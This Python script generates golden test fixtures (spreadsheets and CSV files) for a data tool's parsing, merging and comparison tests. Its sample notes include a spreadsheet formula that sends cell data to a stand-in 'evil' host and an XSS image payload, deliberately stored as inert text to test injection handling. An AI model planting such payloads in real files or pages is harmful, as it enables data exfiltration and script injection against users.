"""Deterministically (re)generate the golden test fixtures in this directory.

Run: .venv/bin/python tests/fixtures/make_golden.py

xlsx files are only rewritten when their cell contents change (zip timestamps would otherwise
dirty git on every run).
"""
import csv
import datetime as dt
import os

import openpyxl

HERE = os.path.dirname(os.path.abspath(__file__))
FIXED = dt.datetime(2024, 1, 1, 0, 0, 0)

HEADER = ["ID", "Zip", "Account", "BigId", "Amount", "Region", "Date", "DateText", "EuroNum",
          "Pct", "Flag", "Name", "Email", "Notes"]
NAMES = ["Alice", "Bob", "Carol", "Dave"]
NOTES = ['=HYPERLINK("http://evil/?"&A2,"x")', "x|||y", "<img src=x onerror=alert(1)>", "café"]
DATE_TEXT = ["01/02/2024", "2024-03-05", "13/02/2024"]
EURO = ["2,5", "1.234,56", "10"]
PCT = ["50%", 0.5, "12.5%"]


def main_rows():
    rows = []
    for i in range(40):
        name = NAMES[i % 4]
        rows.append([
            f"PR-{i + 1:05d}",
            f"0{1000 + i * 7:04d}",                       # text with leading zero
            None if i == 4 else 1000 + i,                 # numeric with one blank
            str(9007199254740993 + i),                    # text, beyond float precision
            None if i == 10 else round(i * 37.5 - 300, 2),  # negatives, one blank
            ["N", "S", None][i % 3],
            dt.datetime(2024, 1, 1) + dt.timedelta(days=i),
            DATE_TEXT[i % 3],
            EURO[i % 3],
            PCT[i % 3],
            i % 2 == 0,
            name,
            None if i == 1 else f"{name.lower()}{i}@example.com",
            NOTES[i % 4],
        ])
    rows[7] = list(rows[6])  # exact duplicate of the row above (ID 7)
    return rows


def sheet_values(ws):
    return [[c.value for c in row] for row in ws.iter_rows()]


def write_xlsx_if_changed(path, sheets):
    wb = openpyxl.Workbook()
    wb.remove(wb.active)
    for title, rows in sheets.items():
        ws = wb.create_sheet(title)
        for r in rows:
            ws.append(r)
        for row in ws.iter_rows():
            for c in row:
                if isinstance(c.value, str) and c.value.startswith("="):
                    c.data_type = "s"  # keep hostile text as text, not a live formula
    wb.properties.creator = "DataDragon fixtures"
    wb.properties.created = FIXED
    wb.properties.modified = FIXED
    if os.path.exists(path):
        old = openpyxl.load_workbook(path)
        same = old.sheetnames == wb.sheetnames and all(
            sheet_values(old[n]) == sheet_values(wb[n]) and
            [[c.data_type for c in r] for r in old[n].iter_rows()] ==
            [[c.data_type for c in r] for r in wb[n].iter_rows()]
            for n in wb.sheetnames)
        if same:
            return False
    wb.save(path)
    return True


def write_csv(name, header, rows, encoding="utf-8"):
    with open(os.path.join(HERE, name), "w", newline="", encoding=encoding) as f:
        w = csv.writer(f, lineterminator="\n")
        w.writerow(header)
        w.writerows(rows)


def csv_cell(v):
    if v is None:
        return ""
    if isinstance(v, dt.datetime):
        return v.strftime("%Y-%m-%d")
    return v


def main():
    rows = main_rows()
    write_xlsx_if_changed(os.path.join(HERE, "golden.xlsx"), {
        "Main": [HEADER] + rows,
        "Second": [["A", "B"]] + [[f"s{i}", i] for i in range(5)],
    })
    write_csv("golden.csv", HEADER, [[csv_cell(v) for v in r] for r in rows])

    with open(os.path.join(HERE, "golden_cp1252.csv"), "wb") as f:
        f.write("Text,Price\n“Quoted”,€5\n".encode("cp1252"))

    write_csv("merge_left.csv", ["id", "left_val"], [[1, "a"], ["", "b"], ["", "c"], [2, "d"], [2, "e"]])
    write_csv("merge_right.csv", ["id", "right_val"], [[1, "x"], ["", "y"], ["", "z"], [2, "p"], [3, "q"]])

    write_csv("compare_a.csv", ["k1", "v"], [[1, "a"], [2, "b"]])
    write_csv("compare_b.csv", ["k1", "v"], [[1, "a"], [2, "b"], ["", "z"]])
    write_csv("compare_dup_a.csv", ["k1", "v"], [[1, "a"], [1, "b"]])
    write_csv("compare_dup_b.csv", ["k1", "v"], [[1, "a"], [1, "CHANGED"]])
    write_csv("compare_null_a.csv", ["k", "v"], [[1, "a"], ["", "b"]])
    write_csv("compare_null_b.csv", ["k", "v"], [[1, "a"], ["", "b"]])

    write_csv("pdf_inject.csv", ["id", "a<b"], [[1, "x"], [2, "y"]])


if __name__ == "__main__":
    main()
